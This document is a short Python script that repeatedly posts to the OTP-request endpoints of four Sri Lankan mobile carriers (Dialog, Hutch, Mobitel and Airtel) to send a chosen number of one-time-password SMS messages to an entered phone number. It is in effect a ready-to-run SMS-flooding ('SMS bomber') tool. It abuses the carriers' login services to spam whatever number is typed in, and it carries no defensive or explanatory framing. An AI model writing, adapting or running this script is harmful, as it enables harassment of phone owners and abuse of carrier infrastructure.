import requests

def send_otp(isp, phone_number, count):
    success_count = 0
    for _ in range(count):
        if isp == "dialog":
            url = "https://ringintones.dialog.lk/prbt/generateotp"
            json_data = {"msisdn": phone_number, "type": None}
            response = requests.post(url, json=json_data)

        elif isp == "hutch":
            url = "https://crbt.hutch.lk/HutchWeb/Registration"
            data = {"mobilenumber": phone_number}
            response = requests.post(url, data=data)

        elif isp == "mobitel":
            url = "https://mtunes.mobitel.lk/tpapi/RBT.aspx"
            json_data = {"msisdn": "94" + phone_number, "action": "login", "type": "requestotp", "lang": "English"}
            headers = {"X-IMI-CHANNEL": "WEB"}
            response = requests.post(url, json=json_data, headers=headers)

        elif isp == "airtel":
            url = "https://vas.airtel.lk/user/otp-generate"
            data = {"msisdn": phone_number, "otp_request_type": 1}
            response = requests.post(url, data=data)

        else:
            return "Invalid ISP"

        if response.status_code == 200:
            success_count += 1

    return f"{success_count} out of {count} OTPs sent successfully"

# User input
isp = input("Enter your ISP (dialog, hutch, mobitel, airtel): ").lower()
phone_number = input("Enter your phone number: ")
num_messages = int(input("How many SMS messages do you want to send? "))

# Send OTPs
result = send_otp(isp, phone_number, num_messages)
print(result)
